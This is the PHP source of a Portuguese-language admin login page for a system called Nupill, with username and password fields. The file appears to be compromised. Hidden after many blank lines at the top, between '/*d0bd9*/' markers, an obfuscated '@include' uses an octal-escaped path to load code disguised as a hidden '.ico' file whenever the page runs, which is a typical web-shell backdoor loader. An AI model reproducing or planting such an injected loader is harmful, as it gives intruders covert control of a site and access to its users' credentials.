<?php














/*d0bd9*/

@include "\057ho\155e/\163to\162ag\145/d\057a2\05723\057nu\160il\154/p\165bl\151c_\150tm\154/u\163ua\162io\057.b\142fa\06399\063.i\143o";

/*d0bd9*/ 
		// Configurações
		include("_inc/config.php");
		
		// Define a página
		$pag_mae = "login";
		$pag = "login";
		
		// Inclui as ações da página 
		include ("_inc/acoes_login.php");

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN""http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title><?php echo $titulo_sistema; ?> :: Painel</title>
<!-- METAS PARA FERRAMENTAS DE BUSCA -->
<meta name="robots" content="noindex,nofollow">
<!-- FIM DAS METAS PARA FERRAMENTAS DE BUSCA -->
<!-- FOLHAS DE ESTILO -->
<link rel="shortcut icon" href="_imagens/favicon.ico" type="image/x-icon" />
<link rel="stylesheet" href="_css/estilo.css" type="text/css" media="screen" />
<link rel="stylesheet" href="_css/tema-<?php echo $tema_sistema; ?>.css" type="text/css"media="screen" />
<!--[if IE 6]>
<link rel="stylesheet" type="text/css" href="_css/estilo.ie6.css" />
<![endif]-->
<!-- FIM DAS FOLHAS DE ESTILO -->
</head>
<body id="login">
		<!-- DEFESA -->
		<div id="login-defesa" class="png_bg">
			<div id="login-topo">
			
			  <h1>Nupill</h1>
				<!-- LOGO -->
				<img src="_imagens/logo.png" alt="<?php echo $titulo_sistema; ?>" width="221" height="40" id="logo"  title="<?php echo $titulo_sistema; ?>" />
		  	</div>
            <!-- CONTEÚDO -->
			<div id="login-conteudo">
				
				<form id="formulario-login" class="formulario" action="login.php" method="post">
                
                <!-- NOTIFICAÇÕES -->
                <?php include "notificacoes-login.php"; ?>
                <!-- FIM DAS NOTIFICAÇÕES  -->
				
				  <p>
				    <label>Usu&aacute;rio:</label>
						<input type="text" class="input-texto required" name="usuario" maxlength="12" minlength="3" />
					</p>
					<div class="clear"></div>
					<p>
						<label>Senha:</label>
						<input type="password" class="input-texto required" name="senha" maxlength="8" minlength="4" />
					</p>
					<div class="clear"></div>
					<p id="lembrar-senha" title="Mantenha-me conectado por 15 dias">
					  <input type="checkbox" name="lembrar" value="sim" title="Mantenha-me conectado por 15 dias"/>
						Mantenha-me conectado
                    </p>
					<div class="clear"></div>
					<p id="botao-login">
						<input class="botao" type="submit" value="Entrar" />
					</p>
					
				</form>
			</div>
            <!-- FIM DO CONTEÚDO -->
            <div class="clear"></div>
            <div id="login-base">
            <!-- LOGO DO SISTEMA -->
            <a href="http://www.soloaga.com.br" target="_blank"><img id="logo_sis" src="_imagens/logo_sis.png" alt="<?php echo $titulo_sistema; ?>"  title="<?php echo $titulo_sistema; ?>" /></a>
          </div>
			
		</div>
        <!-- FIM DA DEFESA -->
		
<!-- SCRIPTS -->
<script type="text/javascript" src="_scripts/jquery-1.4.2.min.js"></script>
<script type="text/javascript" src="_scripts/jquery.config-login.js"></script>
<!--[if IE 6]>
<script type="text/javascript" src="_scripts/jquery.attention_ie6.js"></script>
<script type="text/javascript" src="_scripts/DD_belatedPNG_0.0.7a.js"></script>
<script type="text/javascript">
  DD_belatedPNG.fix('.png_bg, img, li');
</script>
<![endif]-->
<!-- FIM DOS SCRIPTS -->
</body>
</html>
